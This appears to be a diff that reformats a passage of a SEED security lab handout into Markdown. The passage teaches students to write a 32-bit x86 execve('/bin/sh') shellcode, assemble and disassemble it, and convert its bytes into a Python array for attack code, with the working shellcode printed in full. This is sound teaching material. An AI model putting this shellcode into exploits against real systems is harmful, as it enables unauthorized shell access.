@@ -39,115 +39,93 @@ In this task, we will first start with a shellcode example, to demonstrate how t
 
 ### 2.1 Task 1.a: The Entire Process
 
-In this task, we provide a basic x86 shellcode to show students how to write a shellcode from scratch.
-Students can download this code from the lab’s website, go through the entire process described in this task.
-The code is provided in the following.Note:please do not copy and paste from this PDF file, because some
-of characters might be changed due to the copy and paste. Instead, download the file from the lab’s website.
-Brief explanation of the code is given in the comment, but if students want to see a full explanation, they
-can find much more detailed explanation of the code in the SEED book (Chapter 4.7) and also in the SEED
-lecture (Lecture 30 of the Computer Security course).
+In this task, we provide a basic x86 shellcode to show students how to write a shellcode from scratch. Students can download this code from the lab’s website, go through the entire process described in this task. The code is provided in the following. **Note:** please do not copy and paste from this PDF file, because some of characters might be changed due to the copy and paste. Instead, download the file from the lab’s website.
+<Br>
+&emsp; Brief explanation of the code is given in the comment, but if students want to see a full explanation, they can find much more detailed explanation of the code in the SEED book (Chapter 4.7) and also in the SEED lecture (Lecture 30 of the Computer Security course).
 
-Listing 1: A basic shellcode examplemysh.s
+**Listing 1:** A basic shellcode example `mysh.s`
+```
 section .text
-global _start
-_start:
-; Store the argument string on stack
-xor eax, eax
-push eax ; Use 0 to terminate the string
-push "//sh" ;
-push "/bin"
-mov ebx, esp ; Get the string address
+    global _start
+        _start:
+            ; Store the argument string on stack
+            xor eax, eax
+            push eax         ; Use 0 to terminate the string
+            push "//sh"      ;                                ➊
+            push "/bin"
+            mov ebx, esp     ; Get the string address
 
-```
-; Construct the argument array argv[]
-push eax ; argv[1] = 0 À
-push ebx ; argv[0] points to the cmd string Ã
-mov ecx, esp ; Get the address of argv[]
-```
-```
-; For environment variable
-xor edx, edx ; No env variable Õ
-```
-```
-; Invoke execve()
-xor eax, eax ; eax = 0x
-mov al, 0x0b ; eax = 0x0000000b
-int 0x
-```
-Compiling to object code. We compile the assembly code above (mysh.s) usingnasm, which is an
-assembler and disassembler for the Intel x86 and x64 architectures. The-f elf32option indicates that
-we want to compile the code to 32-bit ELF binary format. The Executable and Linkable Format (ELF) is
-a common standard file format for executable file, object code, shared libraries. For 64-bit assembly code,
-elf64should be used.
 
+            ; Construct the argument array argv[]
+            push eax ; argv[1] = 0                            ➋
+            push ebx ; argv[0] points to the cmd string       ➌
+            mov ecx, esp ; Get the address of argv[]
+
+            ; For environment variable
+            xor edx, edx ; No env variable                    ➍
+            
+            ; Invoke execve()
+            xor eax, eax ; eax =  0x00000000
+            mov al, 0x0b ; eax = 0x0000000b
+            int 0x80
+```
+
+**Compiling to object code.** We compile the assembly code above (`mysh.s`) using `nasm`, which is an assembler and disassembler for the Intel x86 and x64 architectures. The `-f elf32` option indicates that we want to compile the code to 32-bit ELF binary format. The Executable and Linkable Format (ELF) is a common standard file format for executable file, object code, shared libraries. For 64-bit assembly code, `elf64` should be used.
+```
 $ nasm -f elf32 mysh.s -o mysh.o
-
-Linking to generate final binary. Once we get the object codemysh.o, if we want to generate the exe-
-cutable binary, we can run the linker programld, which is the last step in compilation. The-m elfi
-option means generating the 32-bit ELF binary. After this step, we get the final executable codemysh. If
-we run it, we can get a shell. Before and after runningmysh, we print out the current shell’s process IDs
-usingecho $$, so we can clearly see thatmyshindeed starts a new shell.
-
+```
+**Linking to generate final binary.** Once we get the object code `mysh.o`, if we want to generate the executable binary, we can run the linker programld, which is the last step in compilation. The `-m elfi_i386` option means generating the 32-bit ELF binary. After this step, we get the final executable codemysh. If we run it, we can get a shell. Before and after running `mysh`, we print out the current shell’s process IDs usingecho $$, so we can clearly see that `mysh` indeed starts a new shell.
+```
 $ ld -m elf_i386 mysh.o -o mysh
 
-
 $ echo $$
-25751 Ÿthe process ID of the current shell
+25751     <---- the process ID of the current shell
 $ mysh
 $ echo $$
-9760 Ÿthe process ID of the new shell
-
-Getting the machine code. During the attack, we only need the machine code of the shellcode, not a
-standalone executable file, which contains data other than the actual machine code. Technically, only the
-machine code is called shellcode. Therefore, we need to extract the machine code from the executable file or
-the object file. There are various ways to do that. One way is to use theobjdumpcommand to disassemble
+9760      <---- the process ID of the new shell
+```
+**Getting the machine code.** During the attack, we only need the machine code of the shellcode, not a standalone executable file, which contains data other than the actual machine code. Technically, only the machine code is called shellcode. Therefore, we need to extract the machine code from the executable file or the object file. There are various ways to do that. One way is to use the `objdump` command to disassemble
 the executable or object file.
-There are two different common syntax modes for assembly code, one is the AT&T syntax mode, and
-the other is Intel syntax mode. By default,objdumpuses the AT&T mode. In the following, we use the
--Minteloption to produce the assembly code in the Intel mode.
-
+<Br>
+&emsp; There are two different common syntax modes for assembly code, one is the AT&T syntax mode, and the other is Intel syntax mode. By default,objdumpuses the AT&T mode. In the following, we use the `-Mintel` option to produce the assembly code in the Intel mode.
+```
 $ objdump -Mintel --disassemble mysh.o
-mysh.o: file format elf32-i
+mysh.o: file format elf32-i386
 
 Disassembly of section .text:
 
 00000000 <_start>:
-0: **31 db** xor ebx,ebx
-2: **31 c0** xor eax,eax
-... (code omitted) ...
-1f: **b0 0b** mov al,0xb
-21: **cd 80** int 0x
-
-In the above printout, the highlighted numbers are machine code. You can also use thexxdcommand
-to print out the content of the binary file, and you should be able to find out the shellcode’s machine code
-from the printout.
-
+    0: **31 db** xor ebx,ebx
+    2: **31 c0** xor eax,eax
+            ... (code omitted) ...
+    1f: **b0 0b** mov al,0xb
+    21: **cd 80** int 0x80
+```
+&emsp; In the above printout, the highlighted numbers are machine code. You can also use the `xxd` command to print out the content of the binary file, and you should be able to find out the shellcode’s machine code from the printout.
+```
 $ xxd -p -c 20 mysh.o
-7f454c
+7f454c4601010100000000000000000001000300
 ...
-000000000000000000000000 **31db31c0b0d5cd
-31c050682f2f7368682f62696e89e3505389e
-d231c0b00bcd80** 00000000000000000000000000
+00000000000000000000000031db31c0b0d5cd80
+31c050682f2f7368682f62696e89e3505389e131
+d231c0b00bcd8000000000000000000000000000
 ...
+```
 
-Using the shellcode in attacking code. In actual attacks, we need to include the shellcode in our attacking
-code, such as a Python or C program. We usually store the machine code in an array, but converting the
-machine code printed above to the array assignment in Python and C programs is quite tedious if done
-manually, especially if we need to perform this process many times in the lab. We wrote the following
-Python code to help this process. Just copy whatever you get from thexxdcommand (only the shellcode
-part) and paste it to the following code, between the lines marked by""". The code can be downloaded
-from the lab’s website.
+**Using the shellcode in attacking code.** In actual attacks, we need to include the shellcode in our attacking code, such as a Python or C program. We usually store the machine code in an array, but converting the machine code printed above to the array assignment in Python and C programs is quite tedious if done manually, especially if we need to perform this process many times in the lab. We wrote the following Python code to help this process. Just copy whatever you get from the `xxd` command (only the shellcode
+part) and paste it to the following code, between the lines marked by """. The code can be downloaded from the lab’s website.
 
-Listing 2:convert.py
-#!/usr/bin/env python
+**Listing 2:** convert.py
+```
+#!/usr/bin/env python3
 
 
 # Run "xxd -p -c 20 mysh.o", and
 # copy and paste the machine code part to the following:
 ori_sh ="""
-31db31c0b0d5cd
-31c050682f2f7368682f62696e89e3505389e
-d231c0b00bcd
+31db31c0b0d5cd80
+31c050682f2f7368682f62696e89e3505389e131
+d231c0b00bcd80
 """
 
 sh = ori_sh.replace("\n", "")
@@ -156,23 +134,23 @@ length = int(len(sh)/2)
 print("Length of the shellcode: {}".format(length))
 s = ’shellcode= (\n’ + ’ "’
 for i in range(length):
-s += "\\x" + sh[2*i] + sh[2*i+1]
-if i > 0 and i % 16 == 15:
-s += ’"\n’ + ’ "’
+    s += "\\x" + sh[2*i] + sh[2*i+1]
+    if i > 0 and i % 16 == 15:
+        s += ’"\n’ + ’ "’
 s += ’"\n’ + ").encode(’latin-1’)"
 print(s)
+```
 
-Theconvert.pyprogram will print out the following Python code that you can include in your attack
-code. It stores the shellcode in a Python array.
-
+The `convert.py` program will print out the following Python code that you can include in your attack code. It stores the shellcode in a Python array.
+```
 $ ./convert.py
 Length of the shellcode: 35
 shellcode= (
-"\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
-"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
-"\x0b\xcd\x80"
+    "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+    "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
+    "\x0b\xcd\x80"
 ).encode(’latin-1’)
-
+```
 ### 2.2 Task 1.b. Eliminating Zeros from the Code
 
 Shellcode is widely used in buffer-overflow attacks. In many cases, the vulnerabilities are caused by string
